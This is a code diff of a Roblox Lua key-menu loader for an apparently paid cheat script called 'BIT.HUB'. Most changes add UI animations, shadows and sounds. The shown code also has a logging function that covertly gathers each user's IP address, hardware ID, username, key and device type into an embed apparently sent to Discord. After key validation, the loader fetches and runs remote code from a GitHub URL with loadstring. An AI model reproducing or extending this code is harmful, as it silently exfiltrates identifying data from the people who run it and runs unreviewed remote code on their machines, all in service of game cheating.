@@ -1,6 +1,8 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
 local keysUrl = "https://goo.su/ObNz7eZ"
@@ -59,6 +61,16 @@ local function getServerInfo()
     return "unknown"
 end
 
+local function getDeviceType()
+    local deviceType = "unknown"
+    if UserInputService.TouchEnabled then
+        deviceType = "Mobile"
+    elseif UserInputService.KeyboardEnabled then
+        deviceType = "PC"
+    end
+    return deviceType
+end
+
 local function sendLog(keyUsed)
     local http = syn and syn.request or request
     local AnalyticsService = game:GetService("RbxAnalyticsService")
@@ -89,10 +101,10 @@ local function sendLog(keyUsed)
     local displayName = player.DisplayName  
     local userId = player.UserId
     local placeId = game.PlaceId
-    local jobId = game.JobId
     local accountAge = player.AccountAge
     local gameName = getGameName()
     local serverInfo = getServerInfo()
+    local deviceType = getDeviceType()
 
     local data = {
         ["content"] = "",
@@ -101,7 +113,7 @@ local function sendLog(keyUsed)
                 ["title"] = "Player inject information",
                 ["color"] = 8956648,
                 ["image"] = {  
-                ["url"] = "https://cdn.discordapp.com/attachments/1340306508058984468/1340307808679231489/IMG_0374.gif?ex=67bc6e6b&is=67bb1ceb&hm=7827df2dd7406c4c3bef58122a6a1306fc17a4e4f13abff6e06debad77d2be30&"  
+                    ["url"] = "https://cdn.discordapp.com/attachments/1340306508058984468/1340307808679231489/IMG_0374.gif?ex=67bc6e6b&is=67bb1ceb&hm=7827df2dd7406c4c3bef58122a6a1306fc17a4e4f13abff6e06debad77d2be30&"  
                 },
                 ["fields"] = {
                     { ["name"] = "Username", ["value"] = username, ["inline"] = true },
@@ -109,11 +121,12 @@ local function sendLog(keyUsed)
                     { ["name"] = "Account Age", ["value"] = tostring(accountAge) .. " days", ["inline"] = false },
                     { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = true },
                     { ["name"] = "PlaceID", ["value"] = tostring(placeId), ["inline"] = true },
-                    { ["name"] = "JobID", ["value"] = jobId, ["inline"] = false },
+                    { ["name"] = "Server Name", ["value"] = serverInfo, ["inline"] = false },
                     { ["name"] = "HWID", ["value"] = hwid, ["inline"] = false },
                     { ["name"] = "IP", ["value"] = ipAddress, ["inline"] = false },
                     { ["name"] = "Key", ["value"] = keyUsed, ["inline"] = false },
-                    { ["name"] = "Executor", ["value"] = executor, ["inline"] = false }
+                    { ["name"] = "Executor", ["value"] = executor, ["inline"] = false },
+                    { ["name"] = "Device Type", ["value"] = deviceType, ["inline"] = true }
                 },
                 ["footer"] = {
                     ["text"] = "BIT.HUB | Paid",
@@ -145,11 +158,27 @@ local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
 screenGui.Name = "KeyMenu"
 
 local keyFrame = Instance.new("Frame", screenGui)
-keyFrame.Size = UDim2.new(0, 320, 0, 180) 
+keyFrame.Size = UDim2.new(0, 320, 0, 180)
 keyFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
 keyFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 keyFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 keyFrame.BorderSizePixel = 0
+keyFrame.Visible = false
+keyFrame.ZIndex = 2
+
+local frameShadow = Instance.new("ImageLabel", keyFrame)
+frameShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+frameShadow.BackgroundTransparency = 1
+frameShadow.BorderSizePixel = 0 
+frameShadow.Image = "rbxassetid://7331400934"
+frameShadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
+frameShadow.Name = "#shadow"
+frameShadow.Position = UDim2.fromScale(0.5, 0.5)
+frameShadow.ScaleType = "Slice"
+frameShadow.Size = UDim2.new(1, 50, 1, 55)
+frameShadow.SliceCenter = Rect.new(40, 40, 260, 260)
+frameShadow.SliceScale = 1
+frameShadow.ZIndex = 1
 
 if not keyFrame:FindFirstChild("Gradient") then
     local gradient = Instance.new("UIGradient")
@@ -167,24 +196,33 @@ topLine.Size = UDim2.new(1, 0, 0, 2)
 topLine.Position = UDim2.new(0, 0, 0, 0)
 topLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 topLine.BorderSizePixel = 0
+topLine.ZIndex = 3
 
 local bottomLine = Instance.new("Frame", keyFrame)
 bottomLine.Size = UDim2.new(1, 0, 0, 2) 
 bottomLine.Position = UDim2.new(0, 0, 1, -2) 
 bottomLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 bottomLine.BorderSizePixel = 0
+bottomLine.ZIndex = 3
 
 local titleLabel = Instance.new("TextLabel", keyFrame)
-titleLabel.Size = UDim2.new(1, 0, 0, 25)
-titleLabel.Position = UDim2.new(0, 0, 0.08, 0)
+titleLabel.Size = UDim2.new(1, 0, 0, 40)
+titleLabel.Position = UDim2.new(0, 0, 0.05, 0)
 titleLabel.Text = "BIT.HUB"
 titleLabel.BackgroundTransparency = 1
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 titleLabel.Font = Enum.Font.Arcade
-titleLabel.TextScaled = true
+titleLabel.TextSize = 36
+titleLabel.TextStrokeTransparency = 0.5
+titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+titleLabel.ZIndex = 5
 
-titleLabel.TextStrokeTransparency = 0 
-titleLabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+local textGradient = Instance.new("UIGradient", titleLabel)
+textGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 200, 255))
+}
+textGradient.Rotation = 90
 
 local keyInput = Instance.new("TextBox", keyFrame)
 keyInput.Size = UDim2.new(0.75, 0, 0, 30) 
@@ -196,6 +234,7 @@ keyInput.TextColor3 = Color3.fromRGB(200, 200, 200)
 keyInput.Font = Enum.Font.Arcade
 keyInput.TextScaled = true
 keyInput.BorderSizePixel = 0 
+keyInput.ZIndex = 5
 
 local keyCorner = Instance.new("UICorner", keyInput)
 keyCorner.CornerRadius = UDim.new(0, 8)
@@ -204,6 +243,20 @@ local keyStroke = Instance.new("UIStroke", keyInput)
 keyStroke.Thickness = 1
 keyStroke.Color = Color3.fromRGB(203, 219, 215)
 keyStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+local inputShadow = Instance.new("ImageLabel", keyInput)
+inputShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+inputShadow.BackgroundTransparency = 1
+inputShadow.BorderSizePixel = 0 
+inputShadow.Image = "rbxassetid://7331400934"
+inputShadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
+inputShadow.Name = "#shadow"
+inputShadow.Position = UDim2.fromScale(0.5, 0.5)
+inputShadow.ScaleType = "Slice"
+inputShadow.Size = UDim2.new(1, 50, 1, 55)
+inputShadow.SliceCenter = Rect.new(40, 40, 260, 260)
+inputShadow.SliceScale = 1
+inputShadow.ZIndex = 4
 
 local checkKeyButton = Instance.new("TextButton", keyFrame)
 checkKeyButton.Size = UDim2.new(0.55, 0, 0, 30) 
@@ -214,6 +267,7 @@ checkKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 checkKeyButton.Font = Enum.Font.Arcade
 checkKeyButton.TextScaled = true
 checkKeyButton.BorderSizePixel = 0
+checkKeyButton.ZIndex = 5
 
 local buttonCorner = Instance.new("UICorner", checkKeyButton)
 buttonCorner.CornerRadius = UDim.new(0, 8)
@@ -222,6 +276,20 @@ local buttonStroke = Instance.new("UIStroke", checkKeyButton)
 buttonStroke.Thickness = 1
 buttonStroke.Color = Color3.fromRGB(203, 219, 215)
 buttonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+local buttonShadow = Instance.new("ImageLabel", checkKeyButton)
+buttonShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+buttonShadow.BackgroundTransparency = 1
+buttonShadow.BorderSizePixel = 0 
+buttonShadow.Image = "rbxassetid://7331400934"
+buttonShadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
+buttonShadow.Name = "#shadow"
+buttonShadow.Position = UDim2.fromScale(0.5, 0.5)
+buttonShadow.ScaleType = "Slice"
+buttonShadow.Size = UDim2.new(1, 50, 1, 55)
+buttonShadow.SliceCenter = Rect.new(40, 40, 260, 260)
+buttonShadow.SliceScale = 1
+buttonShadow.ZIndex = 4 
 
 local errorMessage = Instance.new("TextLabel", keyFrame)
 errorMessage.Size = UDim2.new(0.8, 0, 0, 25)
@@ -232,32 +300,63 @@ errorMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
 errorMessage.Font = Enum.Font.Arcade
 errorMessage.TextScaled = true
 errorMessage.BorderSizePixel = 0 
+errorMessage.ZIndex = 5 
 
+local clickSound = Instance.new("Sound")
+clickSound.SoundId = "rbxassetid://452267918" 
+clickSound.Volume = 0.5
+clickSound.Parent = keyFrame
 
-local UserInputService = game:GetService("UserInputService")
+local typeSound = Instance.new("Sound")
+typeSound.SoundId = "rbxassetid://9116157309" 
+typeSound.Volume = 1
+typeSound.Parent = keyFrame
+
+local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+
+local function anim()
+    keyFrame.Size = UDim2.new(0, 0, 0, 0)
+    keyFrame.Visible = true
+    local tween = TweenService:Create(keyFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 180)})
+    tween:Play()
+end
+
+local function closeanim(callback)
+    local tween = TweenService:Create(keyFrame, tweenInfo, {Size = UDim2.new(0, 0, 0, 0)})
+    tween:Play()
+    tween.Completed:Connect(function()
+        keyFrame.Visible = false
+        if callback then callback() end
+    end)
+end
+
+local slideTweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
 
 local dragging
 local dragInput
 local dragStart
 local startPos
+local lastPosition
+local velocity = Vector2.new(0, 0)
 
 keyFrame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
         dragging = true
         dragStart = input.Position
         startPos = keyFrame.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
+        lastPosition = input.Position
+        clickSound:Play()
     end
 end)
 
 keyFrame.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement then
         dragInput = input
+        if dragging then
+            local currentPosition = input.Position
+            velocity = (currentPosition - lastPosition) * 60
+            lastPosition = currentPosition
+        end
     end
 end)
 
@@ -271,22 +370,56 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and dragging then
+        dragging = false
+        local currentPos = keyFrame.Position
+        local slideDistance = velocity * 0.1
+        local targetPos = UDim2.new(
+            currentPos.X.Scale, currentPos.X.Offset + slideDistance.X,
+            currentPos.Y.Scale, currentPos.Y.Offset + slideDistance.Y
+        )
+        
+        local slideTween = TweenService:Create(keyFrame, slideTweenInfo, {Position = targetPos})
+        slideTween:Play()
+    end
+end)
+
+keyInput:GetPropertyChangedSignal("Text"):Connect(function()
+    if #keyInput.Text > 0 then
+        typeSound:Play()
+    end
+end)
+
+checkKeyButton.MouseEnter:Connect(function()
+    TweenService:Create(checkKeyButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(130, 149, 168)
+    }):Play()
+end)
+
+checkKeyButton.MouseLeave:Connect(function()
+    TweenService:Create(checkKeyButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(110, 129, 148)
+    }):Play()
+end)
+
 checkKeyButton.MouseButton1Click:Connect(function()
+    clickSound:Play()
     local userInputKey = keyInput.Text
 
     if isValidKey(userInputKey) then
-        keyFrame.Visible = false
-        screenGui:Destroy()
+        closeanim(function()
+            screenGui:Destroy()
+            sendLog(userInputKey)
 
-        sendLog(userInputKey)
+            local success, errorMessage = pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/aladin667/phtlox/refs/heads/main/mvb.lua", true))()
+            end)
 
-        local success, errorMessage = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/aladin667/phtlox/refs/heads/main/mvb.lua", true))()
+            if not success then
+                warn("error loading script:", errorMessage)
+            end
         end)
-
-        if not success then
-            warn("error loading script:", errorMessage)
-        end
     else
         errorMessage.Text = "Invalid key"
         wait(1)
@@ -295,3 +428,5 @@ checkKeyButton.MouseButton1Click:Connect(function()
         errorMessage.Text = ""
     end
 end)
+
+anim()
